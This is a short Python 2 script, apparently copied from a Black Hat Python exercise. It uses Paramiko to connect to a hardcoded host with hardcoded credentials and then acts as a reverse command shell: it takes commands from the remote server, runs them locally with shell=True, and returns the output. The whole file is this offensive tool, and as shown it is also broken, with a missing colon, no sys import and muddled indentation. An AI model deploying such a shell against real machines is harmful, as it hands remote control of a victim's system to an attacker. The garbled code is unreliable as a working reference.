#!/usr/bin/env python
 
#SSH with Paramiko pg 27

import threading, paramiko, subprocess

def usage():  #Provide description of program
    print "Black Hat Python SSH with Paramiko pg 27"
    print ""
    print "Enter Syntax or information for how program works"
    print ""
    sys.exit(0)


def main()
  if not len(sys.argv[1:]):
        usage()

	def ssh_command(ip, user, passwd, command):
		client = paramiko.SSHClient()
		#client.load_host_keys('/home/justin/.ssh/known_hosts')
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(ip, username= user, password= passwd)
		ssh_session = client.get_transport().open_session()
		if ssh_session.active:
			ssh_session.exec_command(command)
			print ssh_session.recv(1024) 					#read banner
			while True:
				command = ssh_session.recv(1024)			#get the command from the SSH server
				try:
					cmd_output = subprocess.check_output(command, shell=True)
					ssh_session.send(cmd_output)
				except Exception,e:
					ssh_session.send(str(e))
			client.close()
		return
	ssh_command('192.168.1.59', 'justin', 'lovesthepython','ClientConnected')

main()